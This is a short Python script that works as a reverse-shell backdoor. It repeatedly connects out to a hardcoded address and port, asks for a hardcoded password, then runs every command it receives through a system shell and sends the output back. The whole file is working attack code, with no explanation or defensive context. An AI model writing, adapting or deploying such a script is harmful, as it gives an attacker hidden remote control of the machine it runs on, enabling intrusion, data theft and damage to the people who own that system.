#!/usr/bin/python3
import socket
import subprocess as sp
import os
import time


while True:
    time.sleep(20)
    host = ('192.168.1.81')
    port = 22080
    password = ('gigle')
    def Login():
        global s
        s.send("login: ".encode())
        pwd = s.recv(4096)
        pwd = pwd.decode()

        if pwd.strip() != password:
            Login()
        else:
            s.send("[+] Connected".encode())
            Shell()

    def Shell():
        Conect = True

        while Conect:
            data = s.recv(4096).decode()

            if data.strip() == (":kill"):
                Conect = False
                break

            if data[:2] == ('cd'):
                directory = (data[3:])
                os.chdir(directory.strip())
                s.send('#>'.encode())
                Shell()


            cmd = sp.Popen(data, shell=True ,stdout = sp.PIPE, stderr = sp.PIPE, stdin = sp.PIPE)
            output = cmd.stdout.read() + cmd.stderr.read()
            s.send(output)
            s.send('#>'.encode())

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    Login()
